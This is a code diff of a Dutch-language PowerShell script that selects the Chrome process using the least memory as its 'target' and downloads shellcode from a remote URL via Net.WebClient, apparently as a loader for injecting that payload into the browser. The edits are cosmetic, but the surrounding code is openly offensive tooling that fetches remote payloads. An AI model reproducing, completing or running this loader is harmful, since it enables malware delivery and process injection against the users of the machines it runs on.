@@ -6,7 +6,6 @@ if (-not [Environment]::Is64BitProcess) {
 }
 
 Write-Host "---GEMAAKT DOOR MJBP---" -ForegroundColor Cyan
-Write-Host "---GEMAAKT DOOR MJBP---" -ForegroundColor Cyan
 Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan
 
 $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
@@ -30,12 +29,11 @@ if (-not $edgeProcesses) {
     Write-Host "[+] Chrome succesvol gestart" -ForegroundColor Green
 }
 
-# === BELANGRIJKE WIJZIGING HIER ===
-# Sorteert op laagste geheugengebruik (WorkingSet64)
-$targetProcess = $edgeProcesses | Sort-Object WorkingSet64 -Ascending | Select-Object -First 1
+# === CORRECTE VERSIE: laagste geheugengebruik ===
+$targetProcess = $edgeProcesses | Sort-Object WorkingSet64 | Select-Object -First 1
 $targetPID = $targetProcess.Id
 
-Write-Host "[+] Target Chrome gevonden (PID: $targetPID | Geheugen: $([math]::Round($targetProcess.WorkingSet64/1MB)) MB)" -ForegroundColor Green
+Write-Host "[+] Target Chrome gevonden (PID: $targetPID | Geheugen: $([math]::Round($targetProcess.WorkingSet64/1MB, 1)) MB)" -ForegroundColor Green
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
